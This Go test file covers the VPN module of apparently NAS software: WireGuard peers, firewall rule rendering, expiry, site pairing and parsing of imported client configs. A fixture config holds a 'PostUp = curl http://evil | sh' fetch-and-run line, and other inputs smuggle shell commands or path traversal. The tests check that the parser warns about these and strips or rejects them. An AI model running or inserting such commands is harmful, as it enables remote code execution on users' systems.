package vpn

import (
	"slices"
	"strings"
	"testing"
	"time"

	"strataos/internal/store"
)

func testServer(t *testing.T) store.VPN {
	t.Helper()
	priv, pub, _ := GenKey()
	c := store.VPN{Enabled: true, Endpoint: "nas.example.org", LAN: "192.168.1.0/24", PrivateKey: priv, PublicKey: pub}
	if err := Validate(&c); err != nil {
		t.Fatal(err)
	}
	return c
}

func addPeer(t *testing.T, c *store.VPN, owner, name string, pol Policy, site bool) store.VPNPeer {
	t.Helper()
	p, err := NewPeer(*c, owner, name, pol.Mode)
	if err != nil {
		t.Fatal(err)
	}
	if site {
		p.Kind = "site"
	}
	if err := SetPolicy(*c, &p, pol); err != nil {
		t.Fatal(err)
	}
	c.Peers = append(c.Peers, p)
	return p
}

func TestServices(t *testing.T) {
	got, err := ValidateServices([]string{"SMB", " web", "tcp/8080", "udp/5000-5010", "smb", ""})
	if err != nil || !slices.Equal(got, []string{"smb", "web", "tcp/8080", "udp/5000-5010"}) {
		t.Fatalf("%v %v", got, err)
	}
	for _, bad := range []string{"tcp/0", "tcp/70000", "udp/10-5", "icmp/1", "smb; drop", "tcp/80,443"} {
		if _, err := ValidateServices([]string{bad}); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	tcp, udp := ports([]string{"smb", "tcp/8080", "dns"})
	if !slices.Equal(tcp, []string{"139", "445", "8080", "53"}) || !slices.Equal(udp, []string{"53"}) {
		t.Errorf("ports %v %v", tcp, udp)
	}
}

func TestFirewallPerPeer(t *testing.T) {
	c := testServer(t)
	smb := addPeer(t, &c, "alice", "Phone", Policy{Mode: "nas", Services: []string{"smb"}}, false)
	lan := addPeer(t, &c, "", "Laptop", Policy{Mode: "lan"}, false)
	all := addPeer(t, &c, "", "Travel", Policy{Mode: "all", Services: []string{"web", "udp/53"}}, false)
	site := addPeer(t, &c, "", "Office", Policy{Subnets: []string{"192.168.77.0/24"}}, true)
	fw := RenderFirewall(c)
	for _, want := range []string{
		"table inet strata_wg {",
		`iifname "strata" jump peers`,
		"ip saddr " + smb.IP + " drop\n", // NAS only: nothing forwarded
		"ip saddr " + lan.IP + " ip daddr != { 192.168.1.0/24, 192.168.77.0/24 } drop",
		"ip saddr " + smb.IP + " jump p0",
		"tcp dport { 139, 445 } accept",
		"ip saddr " + all.IP + " jump p1",
		"tcp dport { 80, 443, 7070, 7443 } accept",
		"udp dport { 53 } accept",
		"ip saddr { " + site.IP + ", 192.168.77.0/24 } ip daddr != { 10.8.0.0/24, 192.168.1.0/24 } drop",
		`ip saddr { 10.8.0.0/24, 192.168.77.0/24 } oifname != { "strata" } masquerade`,
	} {
		if !strings.Contains(fw, want) {
			t.Errorf("firewall lacks %q\n%s", want, fw)
		}
	}
	if strings.Contains(fw, "ip saddr "+all.IP+" drop") || strings.Contains(fw, "ip saddr "+lan.IP+" jump") {
		t.Errorf("unexpected rule\n%s", fw)
	}
	// The access mode comes before the services (which accept).
	if strings.Index(fw, "jump reach") > strings.Index(fw, `iifname "strata" jump peers`+"\n  }") && strings.Index(fw, "jump reach") > strings.LastIndex(fw, "jump peers") {
		t.Error("access mode checked after the services")
	}
	// Disabled peers have no rule and no access.
	c.Peers[0].Disabled = true
	if fw := RenderFirewall(c); strings.Contains(fw, smb.IP) || strings.Contains(RenderServer(c), smb.PublicKey) {
		t.Error("disabled peer still configured")
	}
	if RenderFirewall(store.VPN{Subnet: "10.8.0.0/24"}) != "" {
		t.Error("firewall without VPN")
	}
}

func TestExpiryAndOwners(t *testing.T) {
	c := testServer(t)
	now := time.Date(2026, 10, 21, 12, 0, 0, 0, time.UTC)
	a := addPeer(t, &c, "alice", "A", Policy{Mode: "nas"}, false)
	b := addPeer(t, &c, "bob", "B", Policy{Mode: "nas"}, false)
	c.Peers[0].Expires = now.Add(-time.Minute)
	c.Peers[1].Expires = now.Add(time.Hour)
	ok := func(u string) bool { return u == "alice" }
	if Active(c.Peers[0], now, ok) || Active(c.Peers[1], now, ok) {
		t.Error("expired or disabled owner's device active")
	}
	if !Active(c.Peers[1], now, func(string) bool { return true }) {
		t.Error("device of an enabled owner inactive")
	}
	eff := Effective(c, now, ok)
	if !eff.Peers[0].Disabled || !eff.Peers[1].Disabled || c.Peers[0].Disabled {
		t.Error("effective configuration")
	}
	gone := Expire(&c, now)
	if len(gone) != 1 || gone[0].ID != a.ID || !c.Peers[0].Disabled || !c.Peers[0].Expired || c.Peers[1].Disabled {
		t.Errorf("expire %v", gone)
	}
	if len(Expire(&c, now)) != 0 {
		t.Error("expired twice")
	}
	// A new date in the future gives the access back.
	if err := SetPolicy(c, &c.Peers[0], Policy{Mode: "nas", Expires: "2999-01-01"}); err != nil || c.Peers[0].Disabled || c.Peers[0].Expired {
		t.Errorf("renewed: %v %+v", err, c.Peers[0])
	}
	if d, _ := ParseExpiry("2026-12-31"); d.Day() != 1 || d.Month() != 1 {
		t.Errorf("end of day %v", d)
	}
	if _, err := ParseExpiry("tomorrow"); err == nil {
		t.Error("bad date accepted")
	}
	// Names are unique per owner.
	if _, err := NewPeer(c, "bob", "a", ""); err != nil {
		t.Error(err)
	}
	if _, err := NewPeer(c, "bob", "b", ""); err == nil {
		t.Errorf("duplicate name of %s accepted", b.Owner)
	}
	if p, _ := NewPeer(c, "bob", "C", ""); p.Mode != "lan" {
		t.Errorf("default mode %q", p.Mode)
	}
}

func TestSites(t *testing.T) {
	c := testServer(t)
	site := addPeer(t, &c, "", "Office", Policy{Subnets: []string{"192.168.77.1/24", "10.20.0.0/16"}, Endpoint: "office.example.org:51821"}, true)
	if !slices.Equal(site.Subnets, []string{"192.168.77.0/24", "10.20.0.0/16"}) || site.Keepalive != 25 {
		t.Errorf("site %+v", site)
	}
	srv := RenderServer(c)
	for _, want := range []string{"AllowedIPs = " + site.IP + "/32, 192.168.77.0/24, 10.20.0.0/16", "Endpoint = office.example.org:51821", "PersistentKeepalive = 25", "FwMark = 0xcb20"} {
		if !strings.Contains(srv, want) {
			t.Errorf("server lacks %q\n%s", want, srv)
		}
	}
	for _, bad := range [][]string{{"192.168.1.0/25"}, {"10.8.0.0/16"}, {"192.168.77.128/25"}, {"0.0.0.0/0"}, {"fd00::/64"}, {}} {
		p, _ := NewPeer(c, "", "X", "")
		p.Kind = "site"
		if err := SetPolicy(c, &p, Policy{Subnets: bad}); err == nil {
			t.Errorf("subnets %v accepted", bad)
		}
	}
	// Devices in "lan" mode reach the sites too.
	lan := addPeer(t, &c, "", "Laptop", Policy{Mode: "lan"}, false)
	if cl := RenderClient(c, lan); !strings.Contains(cl, "AllowedIPs = 10.8.0.0/24, 192.168.1.0/24, 192.168.77.0/24, 10.20.0.0/16") {
		t.Errorf("client %s", cl)
	}
	r := RenderRouter(c, site, "strata-vm")
	for _, want := range []string{"[Interface]\nPrivateKey = " + site.PrivateKey + "\nAddress = " + site.IP + "/32\nListenPort = 51821", "Endpoint = nas.example.org:51820", "AllowedIPs = 10.8.0.0/24, 192.168.1.0/24", "PresharedKey = " + site.PresharedKey, "/interface wireguard peers add", "/ip route add dst-address=192.168.1.0/24 gateway=wg-strata"} {
		if !strings.Contains(r, want) {
			t.Errorf("router config lacks %q\n%s", want, r)
		}
	}
	// Pairing with another StrataOS (192.168.2.0/24, VPN 10.9.0.0/24).
	code, err := PairingCode(c, site, "Main NAS")
	if err != nil || !strings.HasPrefix(code, "strataos-site:") {
		t.Fatal(code, err)
	}
	other := store.VPN{Enabled: true, Subnet: "10.9.0.0/24", Port: 51820, LAN: "192.168.2.0/24"}
	pr, err := ParsePairing(" " + code[:20] + "\n" + code[20:])
	if err != nil {
		t.Fatal(err)
	}
	l, err := NewLink(other, pr, "")
	if err != nil {
		t.Fatal(err)
	}
	if l.Name != "Main NAS" || l.Iface != "strata-l1" || l.Address != site.IP+"/32" || l.ListenPort != 51821 || l.PeerPublicKey != c.PublicKey || l.Endpoint != "nas.example.org:51820" {
		t.Errorf("link %+v", l)
	}
	if err := ValidateLink(other, l); err != nil {
		t.Error(err)
	}
	conf := RenderLink(l)
	for _, want := range []string{"Address = " + site.IP + "/32", "ListenPort = 51821", "AllowedIPs = 10.8.0.0/24, 192.168.1.0/24", "Endpoint = nas.example.org:51820"} {
		if !strings.Contains(conf, want) {
			t.Errorf("link lacks %q\n%s", want, conf)
		}
	}
	other.Links = append(other.Links, l)
	if _, err := NewLink(other, pr, ""); err == nil {
		t.Error("site imported twice")
	}
	if fw := RenderFirewall(other); !strings.Contains(fw, `iifname "strata-l1" ip daddr != { 192.168.2.0/24, 10.9.0.0/24 } drop`) || !strings.Contains(fw, `oifname != { "strata", "strata-l1" }`) {
		t.Errorf("link firewall\n%s", fw)
	}
	same := store.VPN{Enabled: true, Subnet: "10.8.0.0/24"}
	if _, err := NewLink(same, pr, ""); err == nil {
		t.Error("overlapping VPN networks accepted")
	}
	for _, bad := range []string{"", "strataos-site:", "strataos-site:!!", "nope:" + code[14:]} {
		if _, err := ParsePairing(bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
}

func TestRoutePlan(t *testing.T) {
	cur := "10.8.0.0/24 proto kernel scope link src 10.8.0.1\n10.8.0.2 scope link\n192.168.50.0/24 scope link\n192.168.77.0/24 scope link\n"
	add, del := routePlan(cur, []string{"192.168.77.0/24", "10.20.0.0/16"}, "10.8.0.0/24")
	if !slices.Equal(add, []string{"10.20.0.0/16"}) || !slices.Equal(del, []string{"192.168.50.0/24"}) {
		t.Errorf("add %v del %v", add, del)
	}
}

const providerConf = `# Provider export
[Interface]
PrivateKey = %s
Address = 10.66.0.2/32, fd00:66::2/128
DNS = 10.66.0.1, vpn.example
MTU = 1380
PostUp = curl http://evil | sh

[Peer]
PublicKey = %s
PresharedKey = %s
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 15
`

func TestClientConf(t *testing.T) {
	k1, k2, _ := GenKey()
	k3, _, _ := GenKey()
	conf := providerConf
	for _, k := range []string{k1, k2, k3} {
		conf = strings.Replace(conf, "%s", k, 1)
	}
	cl, warn, err := ParseClientConf(conf)
	if err != nil {
		t.Fatal(err)
	}
	if cl.PrivateKey != k1 || cl.PeerPublicKey != k2 || cl.PresharedKey != k3 || !slices.Equal(cl.Addresses, []string{"10.66.0.2/32"}) || !slices.Equal(cl.AllowedIPs, []string{"0.0.0.0/0"}) || cl.Endpoint != "vpn.example.com:51820" || cl.MTU != 1380 || cl.Keepalive != 15 || len(cl.DNS) != 2 {
		t.Errorf("parsed %+v", cl)
	}
	if !slices.ContainsFunc(warn, func(w string) bool { return strings.Contains(w, "postup") }) || !slices.ContainsFunc(warn, func(w string) bool { return strings.Contains(w, "IPv6") }) {
		t.Errorf("warnings %v", warn)
	}
	out := RenderClientTunnel(cl)
	if strings.Contains(out, "PostUp") || !strings.Contains(out, "Table = off") || !strings.Contains(out, "FwMark = 0xcb20") || !strings.Contains(out, "AllowedIPs = 0.0.0.0/0") || !strings.Contains(out, "Endpoint = vpn.example.com:51820") {
		t.Errorf("tunnel\n%s", out)
	}
	bad := map[string]string{
		"no peer":      strings.Split(conf, "[Peer]")[0],
		"two peers":    conf + "\n[Peer]\nPublicKey = " + k2 + "\n",
		"bad key":      strings.Replace(conf, k1, "abc", 1),
		"bad endpoint": strings.Replace(conf, "vpn.example.com:51820", "vpn.example.com", 1),
		"bad address":  strings.Replace(conf, "10.66.0.2/32", "10.66.0.300/32", 1),
		"bad dns":      strings.Replace(conf, "10.66.0.1", "1.2.3.4; rm", 1),
		"ipv6 only":    strings.Replace(conf, "10.66.0.2/32, ", "", 1),
		"not wg":       "hello",
		"newline key":  strings.Replace(conf, "MTU = 1380", "MTU = 1380\x07", 1),
	}
	for name, txt := range bad {
		if _, _, err := ParseClientConf(txt); err == nil {
			t.Errorf("%s accepted", name)
		}
	}
	cl.Enabled = true
	if err := ValidateClient(store.VPN{Subnet: "10.8.0.0/24", LAN: "192.168.1.0/24"}, &cl); err != nil || cl.Scope != "apps" || cl.AppsSubnet != DefaultAppsSubnet {
		t.Errorf("validate %v %+v", err, cl)
	}
	for _, s := range []string{"192.168.1.0/24", "8.8.8.0/24", "10.0.0.0/8"} {
		x := cl
		x.AppsSubnet = s
		if ValidateClient(store.VPN{Subnet: "10.8.0.0/24", LAN: "192.168.1.0/24"}, &x) == nil {
			t.Errorf("apps network %s accepted", s)
		}
	}
	x := cl
	x.Apps = []string{"qbittorrent", "../x"}
	if ValidateClient(store.VPN{}, &x) == nil {
		t.Error("bad container name accepted")
	}
}

func TestClientRouting(t *testing.T) {
	cl := store.VPNClient{Enabled: true, PrivateKey: "k", Addresses: []string{"10.66.0.2/32"}, Scope: "apps", AppsSubnet: "172.31.250.0/24"}
	var got []string
	for _, c := range ClientRules(cl) {
		got = append(got, strings.Join(c, " "))
	}
	want := []string{
		"-4 route replace default dev strata-out table 52000",
		"-4 rule add pref 5301 from 10.66.0.2 lookup 52000",
		"-4 rule add pref 5300 from 172.31.250.0/24 lookup main suppress_prefixlength 0",
		"-4 rule add pref 5302 from 172.31.250.0/24 lookup 52000",
	}
	if !slices.Equal(got, want) {
		t.Errorf("apps rules\n%s", strings.Join(got, "\n"))
	}
	if k := strings.Join(KillRule(cl.AppsSubnet), " "); k != "-4 rule add pref 5303 from 172.31.250.0/24 blackhole" {
		t.Error(k)
	}
	if d := DockerDropIn(cl.AppsSubnet); !strings.Contains(d, "ExecStartPre=/usr/sbin/ip -4 rule add pref 5303 from 172.31.250.0/24 blackhole") {
		t.Error(d)
	}
	fw := RenderFirewall(store.VPN{Client: cl})
	if !strings.Contains(fw, `iifname "br-strata-vpn" oifname != { "strata-out", "br-strata-vpn" } ip daddr != { 10.0.0.0/8`) || strings.Contains(fw, "masquerade") {
		t.Errorf("kill switch\n%s", fw)
	}
	cl.Scope = "all"
	got = nil
	for _, c := range ClientRules(cl) {
		got = append(got, strings.Join(c, " "))
	}
	if !slices.Contains(got, "-4 rule add pref 5302 not fwmark 52000 lookup 52000") || !slices.Contains(got, "-4 rule add pref 5300 lookup main suppress_prefixlength 0") {
		t.Errorf("all rules %v", got)
	}
	if RenderFirewall(store.VPN{Client: cl}) != "" {
		t.Error("kill switch of the apps in whole-NAS mode")
	}
	if !NeedsForward(store.VPN{Client: cl}) || NeedsForward(store.VPN{}) {
		t.Error("forwarding")
	}
}
